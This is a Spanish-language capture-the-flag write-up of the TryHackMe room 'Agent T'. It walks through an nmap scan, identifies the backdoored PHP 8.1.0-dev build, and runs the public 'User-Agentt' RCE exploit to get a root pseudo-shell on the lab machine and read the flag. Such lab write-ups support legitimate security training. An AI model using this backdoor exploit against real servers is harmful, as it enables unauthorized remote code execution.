---
title: THM - Agent T - Writeup
date: 2022-08-08 09:30:00 +0800
categories: [THM, Writeup]
tags: [thm, writeups]     # TAG names should always be lowercase
---

En esta guía vamos a trabajar con la máquina [Agent T](https://tryhackme.com/room/agentt) disponible en [THM](https://tryhackme.com), un CTF de dificultad baja creado por los usuarios [ben](https://tryhackme.com/p/ben), [JohnHammond](https://tryhackme.com/p/JohnHammond), [cmnatic](https://tryhackme.com/p/cmnatic), [blacknote](https://tryhackme.com/p/blacknote) y [timtaylor](https://tryhackme.com/p/timtaylor).

Dentro música.

## Inicio

> **Disclaimer:** algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.

Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room.

```console
┌──(ewan67㉿kali)-[~]
└─$ sudo openvpn /home/ewan67/VPN_certs/THM_ewan67.ovpn
```

Iniciamos la máquina remota dando al botón&nbsp;&nbsp;<code class="language-plaintext highlighter-rouge" style="background-color:#73c686;color:#fff;">Start Machine</code>

Abrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso:

```console
┌──(ewan67㉿kali)-[~]
└─$ cd Cybersecurity/THM

┌──(ewan67㉿kali)-[~/Cybersecurity/THM]
└─$ mkdir Olympus

┌──(ewan67㉿kali)-[~/Cybersecurity/THM]
└─$ cd Olympus

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ touch notas

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ echo "Notas AgentT" > notas

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ cat notas
Notas AgentT
```

Con la conexión VPN establecida y la máquina remota iniciada, copiamos las IPs que aparecen en la página de THM correspondientes a nuestro equipo y al server remoto. Esto lo hago por costumbre para no tener que estar escribiéndolas cada vez que necesite utilizarlas en algun comando. En mi caso:

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ LIP=10.18.xx.xx             <- la IP de mi equipo via OpenVPN

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ RIP=10.10.105.111           <- la IP de la máquina remota
```

> **Nota:** Como es habitual, esperamos unos minutillos a que el servidor remoto se inicie y arranque todos los servicios antes de empezar a darle cariño.

## Reconocimiento & Enumeración

El hint del room nos sugiere que miremos con atención las cabeceras HTTP que nos devuelve el servidor.

Oído cocina. La cosa apunta a que hay algún tipo de servicio escuchando HTTP. Lanzamos un **nmap** para que nos lo confirme, nos diga puerto, etc.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ nmap -A $RIP -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-08 13:23 CEST
Nmap scan report for 10.10.105.111
Host is up (0.035s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.48 seconds
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón.
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

Qué tenemos aquí ?

* el puerto 80/tcp esta abierto y hay un *PHP cli server 5.5 or later (PHP 8.1.0-dev)* escuchando en él.

Cargamos la IP en un navegador.

![](/assets/posts/20220808/img01.png)

Toca trastear con el Dashboard, de manera manual y valiéndonos de las herramientas habituales para esta tarea (**feroxbuster**, **nikto**, etc).

En este caso, atendiendo al hint que nos dan los autores y la info que nos ha devuelto **nmap** vamos a tirar por otros rumbos, concretamente: cabeceras HTTP.

## Análisis de vulnerabilidades.

Repasemos la salida del **nmap**:

```
[...]
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
[...]
```

*PHP 8.1.0-dev* ? ... qué es esto ? Tiramos de Google. Alegría en los resultados de búsqueda. Nos fijamos especialmente en [éste](https://www.exploit-db.com/exploits/49933).

## Explotación

La página de **exploit-db** nos cuenta que una versión temprana de PHP, la versión PHP 8.1.0-dev, fue lanzada con una puerta trasera el 28 de marzo de 2021, pero la puerta trasera fue rápidamente descubierta y eliminada. Si esta versión de PHP se ejecuta en un servidor, un atacante puede ejecutar código arbitrario enviando la cabecera *User-Agentt*. El exploit propuesto utiliza un backdoor para obtener una pseudo shell en el host.

Toca intentarlo mientras el nombre del room va adquiriendo sentido ;)

Podemos descargar el exploit directamente de la web a nuestro directorio de trabajo o buscarlo en local y copiarlo. Va en gustos.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ searchsploit 8.1.0-dev 
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                                 | php/webapps/49933.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ locate 49933.py
/usr/share/exploitdb/exploits/php/webapps/49933.py

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/49933.py .
```

Lo abrimos en nuestro editor preferido y le echamos un ojo. El cacharro tira de *python3* y al ejecutarlo nos pedirá que le pasemos la dirección del host. Le damos amor.


```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ python3 49933.py         
Enter the full host url:
http://10.10.105.111/

Interactive shell is opened on http://10.10.105.111/ 
Can't acces tty; job crontol turned off.
$ 
```

Dentro. El tema en este caso, según la docu, es que tenemos una *pseudo shell*, es decir, una shell con ciertas *características* particulares ... pero menos da una piedra. A ver qué podemos rascar.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]
└─$ python3 49933.py         
Enter the full host url:
http://10.10.105.111/

Interactive shell is opened on http://10.10.105.111/ 
Can't acces tty; job crontol turned off.
$ whoami
root

$ pwd
/var/www/html

$ ls -la
total 760
drwxr-xr-x 1 root root   4096 Mar  7 22:03 .
drwxr-xr-x 1 root root   4096 Mar 30  2021 ..
-rw-rw-r-- 1 root root    199 Mar  5 22:33 .travis.yml
-rw-rw-r-- 1 root root  22113 Mar  5 22:33 404.html
-rw-rw-r-- 1 root root  21756 Mar  5 22:33 blank.html
drwxrwxr-x 2 root root   4096 Mar  5 22:33 css
-rw-rw-r-- 1 root root   3784 Mar  5 22:33 gulpfile.js
drwxrwxr-x 2 root root   4096 Mar  5 22:33 img
-rw-rw-r-- 1 root root  42145 Mar  7 21:48 index.php
drwxrwxr-x 3 root root   4096 Mar  5 22:33 js
-rw-rw-r-- 1 root root 642222 Mar  5 22:33 package-lock.json
-rw-rw-r-- 1 root root   1493 Mar  5 22:33 package.json
drwxrwxr-x 4 root root   4096 Mar  5 22:33 scss
drwxrwxr-x 8 root root   4096 Mar  5 22:33 vendor

$ cd ..

$ pwd
/var/www/html

$ cd /

$ pwd
/var/www/html

$

```

OK, Somos *root* y *cd* no funciona para poder movernos. No pasa nada, tiramos de *ls* para trastear directorios.

```console

$ ls -la / 
total 76
drwxr-xr-x   1 root root 4096 Mar  7 22:03 .
drwxr-xr-x   1 root root 4096 Mar  7 22:03 ..
-rwxr-xr-x   1 root root    0 Mar  7 22:03 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 30  2021 bin
drwxr-xr-x   2 root root 4096 Nov 22  2020 boot
drwxr-xr-x   5 root root  340 Aug  8 13:56 dev
drwxr-xr-x   1 root root 4096 Mar  7 22:03 etc
-rw-rw-r--   1 root root   38 Mar  5 22:33 flag.txt
drwxr-xr-x   2 root root 4096 Nov 22  2020 home
drwxr-xr-x   1 root root 4096 Mar 30  2021 lib
drwxr-xr-x   2 root root 4096 Jan 11  2021 lib64
drwxr-xr-x   2 root root 4096 Jan 11  2021 media
drwxr-xr-x   2 root root 4096 Jan 11  2021 mnt
drwxr-xr-x   2 root root 4096 Jan 11  2021 opt
dr-xr-xr-x 157 root root    0 Aug  8 13:56 proc
drwx------   2 root root 4096 Jan 11  2021 root
drwxr-xr-x   3 root root 4096 Jan 11  2021 run
drwxr-xr-x   2 root root 4096 Jan 11  2021 sbin
drwxr-xr-x   2 root root 4096 Jan 11  2021 srv
dr-xr-xr-x  13 root root    0 Aug  8 13:56 sys
drwxrwxrwt   1 root root 4096 Mar 30  2021 tmp
drwxr-xr-x   1 root root 4096 Jan 11  2021 usr
drwxr-xr-x   1 root root 4096 Mar 30  2021 var

$ 
```

A la primera y damos con el fichero *flag.txt*. Sin duda ha sido suerte.

```console
[...]
$ cat /flag.txt
flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
$
```

Bingo.

## Final

Lo cierto es que la cosa no ha sido muy difícil esta vez. Para los más curiosos, podéis intentar manipular las cabeceras HTTP con **Burp Suite** o **OWASP ZAP**, los más temerarios incluso con **curl**.

Espero que esta guía os haya resultado de utilidad. Contactarme por Twitter si consideráis que os puedo ayudar con algo.

Sed buenos si no hay una opción mejor.








